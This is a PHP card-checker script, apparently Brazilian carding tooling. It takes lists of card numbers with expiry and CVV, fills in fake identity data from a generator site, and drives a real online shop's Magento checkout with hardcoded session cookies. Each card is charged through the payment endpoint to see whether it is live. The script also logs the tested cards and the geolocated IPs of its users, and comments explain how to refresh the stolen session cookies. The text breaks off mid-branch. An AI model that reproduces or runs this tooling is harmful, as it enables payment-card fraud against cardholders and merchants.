<?php

// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }



if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }

$ip = $_SERVER['REMOTE_ADDR'];



/// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("#Error => Vai se foder randola.....!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("#Error => CC da época das caverna meu irmão kkkkk...!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

          die("#Error => Tacou 000 né? Seu ip foi bloqueado ...!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor");


}




 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============



// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if (empty($scheme)!== false) {

    $retorno_scheme = "NÃO ENCONTRADO";

} else {

    $retorno_scheme = ''.$scheme.'';

}

if (empty($band)!== false) {

    $retorno_band = "NÃO ENCONTRADO";

} else {

    $retorno_band = ''.$band.'';
    
}


if (empty($bank)!== false) {

    $retorno_bank = "NÃO ENCONTRADO";

} else {

    $retorno_bank = ''.$bank.'';
    
}


if (empty($type)!== false) {

    $retorno_type = "NÃO ENCONTRADO";

} else {

    $retorno_type = ''.$type.'';
    
}


if (empty($states)!== false) {

    $retorno_states = "NÃO ENCONTRADO";

} else {

    $retorno_states = ''.$states.'';
    
}


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}


// RETORNOS DOS RESULTADOS DA BIN:  $retorno_band $retorno_scheme  $retorno_states $retorno_bank $retorno_type 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//


// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$numero = metraiapuxar($dados, '"numero":',',', 1);
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$email = metraiapuxar($dados, '"email": "','"', 1);
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)



// ================ // ====================//==========================//============================= // ================================//=================//
// ================ // ================ // ================ // C O O K I E S - T R O C A S  // ================ // ================ // ================ //


$Cookies = 'Cookie: form_key=Vrw6PoqRxPgKuIbt; mage-messages=; _ga=GA1.3.2078959360.1665795793; _gid=GA1.3.1447963786.1665795793; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gat=1; PHPSESSID=4e26d492ea5024191997193601508355; private_content_version=f76407e38223ba41f1cc666125faa170; form_key=Vrw6PoqRxPgKuIbt; X-Magento-Vary=473d4af25966591e7b13cc28b48afeca4662c0ab; mage-cache-sessid=true; section_data_ids={%22customer%22:1665804030%2C%22compare-products%22:1665804030%2C%22last-ordered-items%22:1665804030%2C%22cart%22:1665804030%2C%22directory-data%22:1665804030%2C%22captcha%22:1665804030%2C%22instant-purchase%22:1665804030%2C%22loggedAsCustomer%22:1665804030%2C%22persistent%22:1665804030%2C%22review%22:1665804030%2C%22wishlist%22:1665804030%2C%22recently_viewed_product%22:1665804030%2C%22recently_compared_product%22:1665804030%2C%22product_data_storage%22:1665804030}';


// CONTA: lara-salomao@tuamaeaquelaursa.com|suasenha
//SITE: https://photocolor.com.br
// APÓS LOGADO, ENTRAR NESTE LINK "https://photocolor.com.br/checkout/cart/".
// APÓS TER ACESSADO O LINK ACIMA, PRESSIONE NA PAGINA DO LINK "CTRL + SHIFT + I" E VÁ EM NETWORK.
// AGORA SÓ DAR UM F5 NA PÁGINA E PEGAR O COOKIE  DA PAGINA "cart".
// APÓS PEGAR O COOKIE E COPIAR, COLE NA LINHA 361. E SEJA FELIZ ( DEIXA LOGADO NA VPS A CONTA ...)


// ================ // ====================//==========================//============================= // ================================//=================//
// ================ // ================ // ================ // C O O K I E S - T R O C A S  // ================ // ================ // ================ //




$link_produto = "https://photocolor.com.br/porta-retrato-vda-10x15-019-tabaco.html";

$header_produto =  array (

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
''.$Cookies.'',
'Host: photocolor.com.br',
'Referer: https://photocolor.com.br/',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'


);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_produto);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_produto);
$pagina_produto = curl_exec($ini);
$form = metraiapuxar($pagina_produto, '<input name="form_key" type="hidden" value="','"', 1);



$link_add = "https://photocolor.com.br/checkout/cart/add/uenc/aHR0cHM6Ly9waG90b2NvbG9yLmNvbS5ici9wb3J0YS1yZXRyYXRvLXZkYS0xMHgxNS0wMTktdGFiYWNvLmh0bWw,/product/1029/";


$post_add = '
------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="product"

1029
------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="selected_configurable_option"


------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="related_product"


------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="item"

1029
------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="form_key"

'.$form.'
------WebKitFormBoundaryhbPyeMIWQ4tl661A
Content-Disposition: form-data; name="qty"

1
------WebKitFormBoundaryhbPyeMIWQ4tl661A--
';



$header_add = array (

'Accept: application/json, text/javascript, */*; q=0.01',
'Connection: keep-alive',
'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbPyeMIWQ4tl661A',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/porta-retrato-vda-10x15-019-tabaco.html',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65',
'X-Requested-With: XMLHttpRequest'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_add);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_add);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_add);
$add_item_cart = curl_exec($ini);



$link_cart = "https://photocolor.com.br/checkout/cart/";

$header_cart = array (

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
''.$Cookies.'',
'Host: photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/cart/',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_cart);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_cart);
$cart = curl_exec($ini);
$cart_form = metraiapuxar($cart, '<input name="form_key" type="hidden" value="','"', 1);



$link_setar = "https://photocolor.com.br/checkout/cart/updatePost/";

$post_setar = 'form_key='.$cart_form.'&cart%5B129058%5D%5Bqty%5D=1';

$header_setar = array (

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/cart',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_setar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_setar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_setar);
$setar_quantidade = curl_exec($ini);




$link_checkout = "https://photocolor.com.br/checkout/";

$header_checkout = array (

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
''.$Cookies.'',
'Host: photocolor.com.br',
'Referer: https://photocolor.com.br/porta-retrato-vda-10x15-019-tabaco.html',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'

);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_checkout);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_checkout);
$checkout = curl_exec($ini);





$url_totalinformation = "https://photocolor.com.br/rest/photocolor_view/V1/carts/mine/totals-information";

$post_infomation = '{"addressInformation":{"address":{"countryId":"BR","region":"São Paulo","regionId":"508","postcode":"'.$cep.'"},"shipping_method_code":"pcd","shipping_carrier_code":"pcd"}}';

$header_information = array (

'Accept: */*',
'Connection: keep-alive',
'Content-Type: application/json',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/cart/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65',
'X-Requested-With: XMLHttpRequest'

);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $url_totalinformation);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_information);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_infomation);
$information = curl_exec($ini);


$subtotals = metraiapuxar($information, '"subtotal":',',', 1);




$link_savefrete = "https://photocolor.com.br/rest/photocolor_view/V1/carts/mine/shipping-information";


$post_savefrete = '{"addressInformation":{"shipping_address":{"customerAddressId":"47304","countryId":"BR","regionId":"508","regionCode":"SP","region":"São Paulo","customerId":"47441","street":["'.$cidade.'","563","Jardim","Casa"],"company":null,"telephone":"'.$telefone_fixo.'","fax":"'.$telefone_fixo.'","postcode":"'.$cep.'","city":"'.$cidade.'","firstname":"'.$nome.'","lastname":"'.$nome.'","middlename":null,"prefix":null,"suffix":null,"vatId":null,"customAttributes":[],"extension_attributes":{}},"billing_address":{"customerAddressId":"47304","countryId":"BR","regionId":"508","regionCode":"SP","region":"São Paulo","customerId":"47441","street":["'.$endereco.'","563","Jardim","Casa"],"company":null,"telephone":"'.$telefone_fixo.'","fax":"'.$telefone_fixo.'","postcode":"'.$cep.'","city":"'.$cidade.'","firstname":"'.$nome.'","lastname":"'.$nome.'","middlename":null,"prefix":null,"suffix":null,"vatId":null,"customAttributes":[],"saveInAddressBook":null},"shipping_method_code":"pcd","shipping_carrier_code":"pcd","extension_attributes":{}}}';


$header_savefrete = array (

'Accept: */*',
'Connection: keep-alive',
'Content-Type: application/json',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65',
'X-Requested-With: XMLHttpRequest'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_savefrete);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_savefrete);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_savefrete);
$save_fretes = curl_exec($ini);



$link_methodpayment = "https://photocolor.com.br/rest/photocolor_view/V1/carts/mine/set-payment-information";

$post_methodpayment = '{"cartId":"103196","paymentMethod":{"method":"mestremagecc"}}';


$header_methodpayment = array (

'Accept: */*',
'Connection: keep-alive',
'Content-Type: application/json',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65',
'X-Requested-With: XMLHttpRequest'

);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_methodpayment);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_methodpayment);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_methodpayment);
$method_payment = curl_exec($ini);



$header_metralha = array (

'Accept: */*',
'Connection: keep-alive',
'Content-Type: application/json',
''.$Cookies.'',
'Host: photocolor.com.br',
'Origin: https://photocolor.com.br',
'Referer: https://photocolor.com.br/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65',
'X-Requested-With: XMLHttpRequest'
);

$postfields_metralha = '{"cartId":"103196","billingAddress":{"customerAddressId":"47304","countryId":"BR","regionId":"508","regionCode":"SP","region":"São Paulo","customerId":"47441","street":["'.$endereco.'","563","Jardim","Casa"],"company":null,"telephone":"'.$telefone_fixo.'","fax":"'.$telefone_fixo.'","postcode":"'.$cep.'","city":"'.$cidade.'","firstname":"'.$nome.'","lastname":"'.$nome.'","middlename":null,"prefix":null,"suffix":null,"vatId":null,"customAttributes":[],"saveInAddressBook":null,"extension_attributes":{}},"paymentMethod":{"method":"mestremagecc","additional_data":{"cc_number":"'.$cc.'","cc_type":"mastercard","cc_exp_month":"'.$mes.'","cc_exp_year":"'.$ano.'","cc_cid":"'.$cvv.'","fullname":"'.$nome.'","accepts_save_card":0,"installments":"1","hash":"","deletehistorycard":"","mestremagecc_cpf":"'.$cpf.'"}}}';

$link_metralha = "https://photocolor.com.br/rest/photocolor_view/V1/carts/mine/payment-information";



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_metralha);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_metralha);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_metralha);
$pagar = curl_exec($ini);




$header_localizarip = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://localizeip.com.br',
'referer: https://localizeip.com.br/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'

);

$link_localizarip = "https://localizeip.com.br/";

$postfields_localizarip = 'valor='.$ip.'';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_localizarip);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_localizarip);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_localizarip);
$localizar_ip = curl_exec($ini);


$ip_pais = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>País:</b>','</div>', 1);
$estado_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Estado:</b>','</div>', 1);
$cidade_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Cidade:</b>','</div>', 1);
$provedor_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Provedor:</b>','</div>', 1);



$json = json_decode($pagar, true);
$retorno = $json['message'];




if (strpos($pagar, 'authorized to access')!== false) {

    die("#Error => Cookie expirou, contate o dono do checker...!");

}


if(strpos($pagar, 'erro retornado')!== false){

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span>  » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-info'>VALOR PRODUTO:</span> $subtotals <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


      $ip_users = fopen("IP-USERS.txt", "a");
      fwrite($ip_users, "================================================================\n\n$ip > Localizacao:\n\nPaís: $ip_pais\nEstado: $estado_ip\nCidade: $cidade_ip\nProvedor: $provedor_ip\n\n================================================================\n\n\n");

} else if (strpos($pagar, 'Preecha todos')!== false) {

